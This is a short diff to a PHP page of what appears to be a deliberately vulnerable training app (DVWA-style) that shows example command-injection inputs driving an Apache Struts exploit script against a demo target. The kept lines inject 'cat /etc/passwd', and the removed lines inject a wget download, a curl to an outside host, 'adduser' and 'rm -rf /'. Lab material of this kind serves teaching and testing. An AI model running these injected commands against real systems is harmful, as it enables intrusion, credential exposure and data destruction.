@@ -58,11 +58,7 @@ $page[ 'body' ] .= "
   <h2>docker run -d --rm -p 81:8080 andrefernandes86/demo-apachestruts-target </h2>
 		echo '127.0.0.1| python exploit.py http://target-ip/hello "ls -la"';
 		echo '127.0.0.1| python exploit.py http://target-ip/hello "cat /etc/passwd"';
-		echo '127.0.0.1| python exploit.py http://target-ip/hello "wget http://2016.eicar.org/download/eicar.com"';
-		echo '127.0.0.1| python exploit.py http://target-ip/hello "curl http://wrs21.winshipway.com/"';
-		echo '127.0.0.1| python exploit.py http://target-ip/hello "adduser xxxxx"';
-		echo '127.0.0.1| python exploit.py http://target-ip/hello "ls -la"';
-		echo '127.0.0.1| python exploit.py http://target-ip/hello "rm -rf /"';
+
 </div>\n";
 
 dvwaHtmlEcho( $page );
